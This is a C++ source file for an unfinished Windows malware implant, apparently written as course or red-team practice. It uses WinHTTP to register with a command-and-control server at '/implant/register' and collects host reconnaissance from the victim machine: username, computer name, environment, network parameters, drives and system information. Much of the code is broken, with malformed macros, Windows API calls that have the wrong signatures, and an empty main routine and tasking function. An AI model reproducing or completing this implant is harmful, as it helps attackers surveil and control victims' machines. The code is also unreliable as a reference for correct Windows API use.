#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <iterator>
#include <map>
#include <set>
#include <memory>
#include <thread>
#include <windows.h>
#include <winhttp.h>
#include <Lmcons.h>

//#include <nlohmann/json.hpp>

//#include <jsoncpp/json/value.h>

// #include <rapidjson/document.h>
// #include <rapidjson/writer.h>
// #include <rapidjson/stringbuffer.h>

namespace constants
{
    #define C2 "http://localhost:5000";
    #define REGISTER "/implant/register";
    #define TASK "/implant/task";
    #define SLEEP = 10;
}

std::string makeHttpRequest(std::string fqdn, int port, std::string uri, bool useTLS){
    std::string result;
    // Your code here

    // https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopen

    HINTERNET hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if(hSession == NULL){
        printf("Error in WinHttpOpen: %d", GetLastError());
    }   // open a session

    // https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpconnect

    // LPCWSTR serverName = std::wstring(fqdn.begin(), fqdn.end()).c_str();
    std::wstring name = std::wstring(fqdn.begin(), fqdn.end());
    LPCWSTR serverName = name.c_str();
    // printf("serverName: %ls", serverName);
    INTERNET_PORT serverPort = port;
    HINTERNET hConnect = WinHttpConnect(hSession, serverName, serverPort, 0);

    if(hConnect == NULL){
        printf("Error in WinHttpConnect: %d", GetLastError());
    }   // connect to the server

    // https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopenrequest

    std::wstring uriName = std::wstring(uri.begin(), uri.end());
    LPCWSTR objectName = uriName.c_str();

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", objectName, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, useTLS ? WINHTTP_FLAG_SECURE : 0);

    if(hRequest == NULL){
        printf("Error in WinHttpOpenRequest: %d", GetLastError());
    }   // open a request

    // https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpsendrequest

    if(!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)){
        printf("Error in WinHttpSendRequest: %d", GetLastError());
    }   // send the request

    // https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpreceivehttpresponse

    if(!WinHttpReceiveResponse(hRequest, NULL)){
        printf("Error in WinHttpReceiveResponse: %d", GetLastError());
    }   // receive the response

    // https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpclosehandle

    // Read the data
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    do{
        // Check for available data.
        dwSize = 0;
        if(!WinHttpQueryDataAvailable(hRequest, &dwSize)){
            printf("Error in WinHttpQueryDataAvailable: %d", GetLastError());
        }

        // Allocate space for the buffer.
        pszOutBuffer = new char[dwSize+1];
        if(!pszOutBuffer){
            printf("Out of memory");
            dwSize=0;
        }
        else{
            // Read the Data.
            ZeroMemory(pszOutBuffer, dwSize+1);

            if(!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)){
                printf("Error in WinHttpReadData: %d", GetLastError());
            }
            else{
                result += pszOutBuffer;
            }
            // Free the memory allocated to the buffer.
            delete [] pszOutBuffer;
        }
    }while(dwSize>0);

    // DWORD dwSize = 0;
    // DWORD dwDownloaded = 0;

    // if(!WinHttpQueryDataAvailable(hRequest, &dwSize)){
    //     printf("Error in WinHttpQueryDataAvailable: %d", GetLastError());
    // }
    // else{
    //     char outBuffer[4096];
    //     ZeroMemory(outBuffer, 4096);
    //     while (WinHttpReadData(hRequest, outBuffer, dwSize, &dwDownloaded)){
    //         if (dwDownloaded == 0){
    //             break;
    //         }
    //         else {
    //             for (int i = 0; i < dwDownloaded; i++)
    //             {
    //                 result += outBuffer[i];
    //             }
    //             memset(outBuffer, 0, 4096);
    //             dwDownloaded = 0;
    //         }
    //     }
    // }
    result += "\0";

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return result;
}

int main(int argc,  char* argv[]){
    if(argc !=5){
        std::cout << "Incorrect number of arguments: you need 4 positional arguments" << std::endl;
        return 0;
    }

    std::string fqdn = std::string(argv[1]);
    int port = std::stoi( argv[2] );

    std::string uri = std::string(argv[3]);
    int  useTLS =std::stoi(argv[4]);
    bool tls;

    if (useTLS == 1){
        tls = true;
    } else if (useTLS == 0){
        tls = false;

    } else{
        std::cout << "bad value for useTls" << std::endl;
        return 0;
    }
}

std::string random_id() {
    std::string id;
    for (int i = 0; i < 16; i++) {
        id += (char)rand();
    }
    return id;
}

std::string implant_id = random_id();

char* getEnvirons() {
    char* environs = new char[32767];
    DWORD environs_len = 32767;
    int outputLength = MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, environs, environs_len, nullptr, 0);
    if (outputLength == 0){
        std::cout<< "Error" << std::endl;
        return NULL;
    } 
    LPWSTR outputString = new WCHAR[outputLength + 1];
    GetEnvironmentVariable("PATH", environs, environs_len);
    return environs;
}

char* getComputerName() {
    char* computerName = new char[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computerName_len = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerName(computerName, &computerName_len);
    return computerName;
}

char* getNetworkInterfaces() {
    char* networkInterfaces = new char[32767];
    DWORD networkInterfaces_len = 32767;
    GetNetworkParams(networkInterfaces, &networkInterfaces_len);
    return networkInterfaces;
}

char* getUserName() {
    char* username = new char[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);
    return username;
}

char* changeDirectory() {
    char* directory = new char[32767];
    DWORD directory_len = 32767;
    GetCurrentDirectory(directory_len, directory);
    return directory;
}

char* listFiles() {
    char* files = new char[32767];
    DWORD files_len = 32767;
    GetLogicalDriveStrings(files_len, files);
    return files;
}

char* listProcesses() {
    char* processes = new char[32767];
    DWORD processes_len = 32767;
    GetLogicalDriveStrings(processes_len, processes);
    return processes;
}

char* getSystemInfo() {
    char* systemInfo = new char[32767];
    DWORD systemInfo_len = 32767;
    GetSystemInfo(systemInfo, &systemInfo_len);
    return systemInfo;
}

char* getMachineGUID() {
    char* machineGUID = new char[32767];
    DWORD machineGUID_len = 32767;
    GetSystemInfo(machineGUID, &machineGUID_len);
    return machineGUID;
}

char* getWindowsVersion() {
    char* windowsVersion = new char[32767];
    DWORD windowsVersion_len = 32767;
    GetSystemInfo(windowsVersion, &windowsVersion_len);
    return windowsVersion;
}

char* getSystemScheduledTasks() {
    char* systemScheduledTasks = new char[32767];
    DWORD systemScheduledTasks_len = 32767;
    GetSystemInfo(systemScheduledTasks, &systemScheduledTasks_len);
    return systemScheduledTasks;
}


std::map<std::string, std::string> sit_aware(){
    //make a dictionary in c++
    //https://www.codespeedy.com/dictionary-in-cpp/
    std::map<std::string, std::string> initVals;
    initVals["implant_id"] = random_id();
    initVals["environs"] = getEnvirons();
    initVals["computerName"] = getComputerName();
    initVals["networkInterfaces"] = getNetworkInterfaces();
    initVals["username"] = getUserName();
    initVals["windowsVersion"] = getWindowsVersion();
    initVals["machineGUID"] = getMachineGUID();
    initVals["listFiles"] = listFiles();
    initVals["changeDirectory"] = changeDirectory();
    initVals["listProcesses"] = listProcesses();
    initVals["sysInfo"] = getSystemInfo();
    initVals["scheduleTasks"] = getSystemScheduledTasks();

    return initVals;
}


//register the implant with the C2
bool registerImplant(){
    //create url that basically concatenates C2 and REGISTER
    std::string url = C2 + REGISTER;
    // --------------DEBUG PRINT----------------
    std::cout << "Registering with C2..." << url;

    //variable to hold dictionary sit_awareness output 
    std::map<std::string, std::string> init_data;
    init_data = sit_aware();

    //add the implant_id to the init_data
    init_data["implant_id"] = implant_id;
    //print out init_data to see what it looks like
        // --------------DEBUG PRINT----------------
    for (auto const& x : init_data)
    {
        std::cout << x.first << ": " << x.second << std::endl;
    }

    return true;
    /*
    // Create a RapidJSON document
    rapidjson::Document document;
    document.SetObject();

    // Add the key-value pairs from the map to the JSON object
    for (const auto& [key, value] : init_data) {
        document.AddMember(rapidjson::StringRef(key.c_str()), value, document.GetAllocator());
    }

    // Write the JSON object to a string
    rapidjson::StringBuffer buffer;
    rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
    document.Accept(writer);
    std::string json = buffer.GetString();

    // Print the JSON object
    std::cout << json << std::endl;
*/
}


void tasking(){

}